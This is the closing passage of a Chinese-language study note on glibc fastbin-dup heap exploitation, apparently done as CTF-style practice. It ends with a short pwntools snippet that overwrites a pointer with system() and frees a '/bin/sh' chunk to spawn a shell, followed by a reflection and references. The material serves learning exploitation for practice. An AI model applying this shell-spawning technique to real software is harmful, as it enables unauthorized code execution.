泄露 `libc` 基址之后，即可获得 `system` 地址，通过同样的方法，即可获得 `shell`
```python
sys = lib_base + lib.sym["system"]
edit(1, p64(sys))

add(2, b"/bin/sh\0")
delete(2)
itr()
```
![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260730091445.webp)

---
---
## 📑总结与思考
很感慨。这是第一篇，希望最后一篇来的更晚一点
[Run - Snow Patrol](https://www.bilibili.com/video/BV1WV4y1m7Fd/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click)

---
---
## 🔗 关联与参考
([项目链接](https://github.com/shellphish/how2heap))

---
[^1]: [幼儿堆漏洞利用入门：FastBin Dup Consolidate（第 4.2 部分）| 作者：+Ch0pin🕷️ | 信息安全文章](https://infosecwriteups.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8)

---
[^2]: [malloc.c - malloc/malloc.c - Glibc source code glibc-2.35 - Bootlin Elixir Cross Referencer](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)
[^3]: [malloc.c - malloc/malloc.c - Glibc source code glibc-2.35 - Bootlin Elixir Cross Referencer](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)
[^4]: [malloc.c - malloc/malloc.c - Glibc source code glibc-2.35 - Bootlin Elixir Cross Referencer](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)
[^5]: [malloc.c - malloc/malloc.c - Glibc source code glibc-2.35 - Bootlin Elixir Cross Referencer](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)
[^6]: [malloc.c - malloc/malloc.c - Glibc source code glibc-2.35 - Bootlin Elixir Cross Referencer](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)
[^7]: [9447 CTF 2015：搜索引擎解说 | gsgx](https://gsgx.me/posts/9447-ctf-2015-search-engine-writeup/)